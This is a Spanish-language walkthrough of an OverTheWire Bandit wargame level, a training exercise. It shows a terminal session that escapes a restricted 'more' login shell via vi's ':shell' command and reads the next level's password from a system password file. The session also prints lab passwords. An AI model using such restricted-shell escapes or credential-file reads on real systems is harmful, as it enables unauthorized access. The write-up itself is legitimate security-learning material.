
# Objetivo

Iniciar sesión en bandit26 desde bandit25 debería ser bastante fácil... El shell para el usuario bandit26 no es /bin/bash, sino algo más. Descubra qué es, cómo funciona y cómo salir de él.
## Datos de acceso al nivel
Host al que se va a conectar: **bandit.labs.overthewire.org**.
Puerto: **2220**.
Usuario: **bandit25**.
Contraseña: Encontrada en el nivel anterior: `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`.

## Solución
```
bandit25@bandit:~$ ls -l
total 4
-r-------- 1 bandit25 bandit25 1679 Oct  5 06:19 bandit26.sshkey
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~                                   
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~                                          
~                                               
~     
~                                           
~                                                                         
~                     
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
bandit26@bandit:~$ 
```

## Notas adicionales


## Referencias

[https://www.youtube.com/watch?v=xI-BnTA2-ys](https://www.youtube.com/watch?v=xI-BnTA2-ys "https://www.youtube.com/watch?v=xI-BnTA2-ys")

ssh, cat, more, vi, ls, id, pwd